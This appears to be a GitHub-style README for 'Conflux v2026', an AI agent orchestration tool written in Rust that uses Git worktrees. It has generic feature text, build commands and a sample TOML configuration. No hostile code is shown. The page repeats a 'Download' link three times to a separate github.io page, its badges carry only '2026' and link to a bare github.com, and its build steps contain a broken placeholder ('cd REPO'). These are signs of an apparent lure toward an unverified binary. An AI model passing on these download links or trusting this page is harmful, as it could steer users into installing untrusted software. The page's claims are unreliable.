# Conflux v2026 - AI Development Orchestrator 2026

> **Spec-first orchestration for AI agent workflows in Rust. Conflux manages autonomous development through parallel Git worktrees, interactive TUI and headless operation, and a configurable server interface in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-Rust-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/willqxcwest2114/conflux-agent-workflow-2026?style=flat-square)](https://github.com/willqxcwest2114/conflux-agent-workflow-2026)

---

<p align="center">
  <a href="https://willqxcwest2114.github.io/conflux-agent-workflow-2026/">
    <img src="https://img.shields.io/badge/Download-Conflux%20Latest-brightgreen?style=for-the-badge" alt="Download Conflux">
  </a>
</p>

> **[Download Conflux v2026](https://willqxcwest2114.github.io/conflux-agent-workflow-2026/)**

---

[Download Latest Build](https://willqxcwest2114.github.io/conflux-agent-workflow-2026/)

---

## Overview

Conflux provides an orchestration layer for AI-assisted software development based on specifications and coordinated agent activity. It takes a project from an open spec toward implementation by assigning distinct responsibilities, distributing work across parallel Git worktrees, and maintaining an organized workflow throughout development.

The project is intended for LLM-driven agents, autonomous coding cycles, and consistent change-management processes. Interactive TUI operation, headless execution, and a configurable REST-enabled server make it suitable for both hands-on local work and automated systems that require controlled orchestration.

---

## What Conflux Provides

- Drives development processes from open specifications
- Coordinates simultaneous work through Git worktrees
- Keeps implementation and acceptance roles distinct
- Supports agent configurations that are not tied to a particular vendor
- Runs interactively through a TUI or non-interactively in headless mode
- Provides a configurable server mode
- Makes orchestration available through a REST API
- Supports autonomous development patterns centered on open specs

---

## Build from Source

Use a Rust toolchain to clone and compile the project:

```bash
git clone https://github.com/willqxcwest2114/conflux-agent-workflow-2026.git
cd REPO
cargo build --release
```

Once compilation finishes, run the binary from the release directory. You can also start Conflux directly in the operating mode you need, including TUI, headless, or server mode.

---

## Running Conflux

Conflux workflows begin with a specification. From there, agent roles are assigned and the orchestrator handles implementation activity across parallel branches.

A standard process looks like this:

1. Create or bring in an open spec.
2. Set the responsibilities for implementation and acceptance.
3. Choose TUI mode for interactive operation or headless mode for automated runs.
4. Allow Conflux to manage concurrent Git worktrees.
5. Enable server mode when other services or scripts need REST-based control.

Common launch commands include:

```bash
cargo run --release
cargo run --release -- --headless
cargo run --release -- --server
```

The available flags and subcommands may need to be adapted to your repository configuration and local environment.

---

## Settings and Configuration

You can configure agent behavior, orchestration choices, and server parameters to fit your workflow. When using a configuration file, place it in the project root or wherever your runtime environment expects it.

A representative TOML layout is shown below:

```toml
[orchestration]
mode = "headless"
worktrees = true

[agents]
implementation = "builder"
acceptance = "reviewer"

[server]
enabled = true
port = 8080
```

Use only the settings supported by your installed Conflux build and selected agent provider.

---

## System Requirements

- A Rust toolchain to compile the project from source
- Git with support for worktrees
- An environment that can run CLI or TUI software
- Access to an LLM or compatible agent setup
- Enough storage for repository copies and parallel worktrees
- Network connectivity when using server functionality or external model services

---

## Frequently Asked Questions

**Which execution modes are available?**  
Conflux can run interactively in its TUI, without interaction in headless mode, or as a server, depending on how orchestration needs to be controlled.

**Am I restricted to a single agent provider?**  
No. Conflux is designed for vendor-independent agents and can be configured around the provider used by your environment.

**How are runtime and workflow options changed?**  
Use the project configuration and runtime parameters. The specific file path and command-line options depend on your local installation and setup.

**How can I troubleshoot failed parallel worktree operations?**  
Inspect the current Git status, make sure the requested worktree locations are available, and confirm that the repository is in a state that permits concurrent changes before trying again.

**How do I receive newer builds?**  
Download the latest available release or rebuild the project from the repository as updates are published. The download link above leads to the current build location.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
